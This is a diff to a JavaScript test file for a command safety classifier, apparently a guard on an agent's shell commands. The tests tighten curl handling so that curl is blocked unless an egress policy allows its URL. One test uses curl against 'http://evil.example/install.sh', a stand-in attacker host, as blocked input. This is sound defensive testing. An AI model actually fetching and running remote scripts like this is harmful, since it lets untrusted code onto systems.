@@ -123,6 +123,18 @@ test("CommandSafetyClassifier blocks wget inline pipe pattern", () => {
   );
 });
 
+test("CommandSafetyClassifier blocks curl when URL is outside the allowlist", () => {
+  const result = CLASSIFIER.assess("curl", ["http://evil.example/install.sh"]);
+  assert.equal(result.allowed, false);
+  assert.equal(result.reasonCode, "tool.command_url_not_allowed");
+});
+
+test("CommandSafetyClassifier blocks curl without an explicit allowed URL", () => {
+  const result = CLASSIFIER.assess("curl", []);
+  assert.equal(result.allowed, false);
+  assert.equal(result.reasonCode, "tool.curl_blocked_requires_egress_policy");
+});
+
 // ─────────────────────────────────────────────────────────────────────────────
 // Shell Metacharacter Blocking
 // ─────────────────────────────────────────────────────────────────────────────
@@ -303,10 +315,11 @@ test("CommandSafetyClassifier marks rm as high risk", () => {
   assert.equal(result.riskLevel, "high");
 });
 
-test("CommandSafetyClassifier marks curl as high risk", () => {
+test("CommandSafetyClassifier blocks curl until an explicit egress policy exists", () => {
   const result = CLASSIFIER.assess("curl", ["https://example.com"]);
-  assert.equal(result.allowed, true);
-  assert.equal(result.riskLevel, "high");
+  assert.equal(result.allowed, false);
+  assert.equal(result.riskLevel, "critical");
+  assert.equal(result.reasonCode, "tool.curl_blocked_requires_egress_policy");
 });
 
 test("CommandSafetyClassifier marks git as high risk", () => {
